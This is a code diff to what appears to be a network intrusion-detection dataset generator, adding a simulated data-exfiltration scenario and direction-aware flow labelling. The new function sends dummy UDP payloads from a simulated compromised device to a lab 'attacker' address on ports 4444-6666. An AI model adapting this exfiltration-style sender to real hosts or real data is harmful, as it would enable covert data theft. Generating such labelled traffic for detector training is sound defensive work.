@@ -207,6 +207,26 @@ def _brute_force_traffic(host: Any, target_ip: str, port: int, duration: float, 
     )
 
 
+def _exfiltration_traffic(host: Any, attacker_ip: str, port: int, duration: float) -> str:
+    """Repeated large UDP transfers from a compromised device out to an
+    attacker-controlled sink. Direction is reversed from every other
+    dataset scenario here: `host` is the compromised device itself (the
+    traffic source), not the attacker."""
+    return host.cmd(
+        "python3 - <<'PY'\n"
+        "import socket, time\n"
+        "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+        "payload = b'x' * 1200\n"
+        "start = time.time()\n"
+        f"while time.time() - start < {duration}:\n"
+        f"    sock.sendto(payload, ('{attacker_ip}', {port}))\n"
+        "    time.sleep(1.0)\n"
+        "sock.close()\n"
+        "print('exfiltration_dataset_traffic_done')\n"
+        "PY"
+    )
+
+
 def get_scenario_type(run_number: int) -> str:
     """Deterministically assign scenario type based on run number.
 
@@ -234,6 +254,8 @@ def get_scenario_type(run_number: int) -> str:
         return 'dos_flood'
     if attack_key == "brute_force":
         return 'brute_force'
+    if attack_key == "exfiltration":
+        return 'exfiltration'
     raise ValueError(f"No dataset-generation dispatch registered for attack key: {attack_key!r}")
 
 def generate_dataset(
@@ -270,6 +292,10 @@ def generate_dataset(
 
     # Brute-force target port -- a single simulated login/management port
     brute_force_target_ports = [2222, 8022, 9022]
+
+    # Exfiltration sink port -- a single attacker-controlled port
+    exfiltration_target_ports = [4444, 5555, 6666]
+    attacker_ip = "10.0.0.100"
 
 
     rows: list[dict[str, Any]] = []
@@ -348,40 +374,78 @@ def generate_dataset(
                 source = net.get("attacker")
                 dos_port = rng.choice(dos_target_ports)
                 _dos_traffic(source, target_ip, dos_port, duration=2.0)
-            else:
+            elif scenario == "brute_force":
                 # Brute-force traffic
                 source = net.get("attacker")
                 bf_port = rng.choice(brute_force_target_ports)
                 bf_interval = rng.choice([0.2, 0.3, 0.4])
                 _brute_force_traffic(source, target_ip, bf_port, duration=4.0, interval=bf_interval)
+            else:
+                # Exfiltration traffic -- direction reversed: the chosen
+                # target device is the compromised traffic *source*, not
+                # the destination.
+                source = net.get(target_name)
+                exfil_port = rng.choice(exfiltration_target_ports)
+                _exfiltration_traffic(source, attacker_ip, exfil_port, duration=5.0)
 
             current_stage = "process_capture"
             capture_path = monitor.stop_capture(net, capture_session, completion_timeout=4.0)
             events = monitor.read_capture(net, target_name, capture_path)
             features = aggregator.aggregate(events)
             
-            # Label flows
+            # Label flows. Every scenario except exfiltration has the
+            # target device as the flow's destination and the attacker (or
+            # a trusted normal-traffic source) as its source; exfiltration
+            # reverses that -- the target device is the flow's *source*,
+            # sending out to the attacker as destination -- so it needs
+            # its own direction-aware condition rather than sharing the
+            # single "destination_ip == target_ip" gate the others use.
             run_rows = 0
             for feature in features:
-                if feature.destination_ip == target_ip:
-                    # In normal, we trust the source IP. In recon/dos/brute-force, we look for attacker IP.
-                    is_recon = (scenario.startswith("reconnaissance") and feature.source_ip == "10.0.0.100")
-                    is_dos = (scenario == "dos_flood" and feature.source_ip == "10.0.0.100")
-                    is_brute_force = (scenario == "brute_force" and feature.source_ip == "10.0.0.100")
-                    is_normal = (scenario.startswith("normal") and feature.source_ip in {"10.0.0.30", "10.0.0.20"})
+                is_recon = (
+                    scenario.startswith("reconnaissance")
+                    and feature.destination_ip == target_ip
+                    and feature.source_ip == "10.0.0.100"
+                )
+                is_dos = (
+                    scenario == "dos_flood"
+                    and feature.destination_ip == target_ip
+                    and feature.source_ip == "10.0.0.100"
+                )
+                is_brute_force = (
+                    scenario == "brute_force"
+                    and feature.destination_ip == target_ip
+                    and feature.source_ip == "10.0.0.100"
+                )
+                is_exfiltration = (
+                    scenario == "exfiltration"
+                    and feature.source_ip == target_ip
+                    and feature.destination_ip == "10.0.0.100"
+                )
+                is_normal = (
+                    scenario.startswith("normal")
+                    and feature.destination_ip == target_ip
+                    and feature.source_ip in {"10.0.0.30", "10.0.0.20"}
+                )
 
-                    if is_recon or is_dos or is_brute_force or is_normal:
-                        label = 3 if is_brute_force else (2 if is_dos else (1 if is_recon else 0))
-                        rows.append(
-                            flow_to_dataset_row(
-                                feature,
-                                flow_id=f"run-{run_number:04d}-flow-{len(rows):04d}",
-                                run_id=f"run-{run_number:04d}",
-                                scenario_id=f"{scenario}-{run_number:04d}",
-                                label=label,
-                            )
+                if is_recon or is_dos or is_brute_force or is_exfiltration or is_normal:
+                    label = (
+                        4 if is_exfiltration
+                        else 3 if is_brute_force
+                        else 2 if is_dos
+                        else 1 if is_recon
+                        else 0
+                    )
+                    rows.append(
+                        flow_to_dataset_row(
+                            feature,
+                            flow_id=f"run-{run_number:04d}-flow-{len(rows):04d}",
+                            run_id=f"run-{run_number:04d}",
+                            scenario_id=f"{scenario}-{run_number:04d}",
+                            label=label,
                         )
-                        run_rows += 1
+                    )
+                    run_rows += 1
             if run_rows == 0:
                 raise RuntimeError(f"No captured flow for {scenario}")
             successful_runs += 1
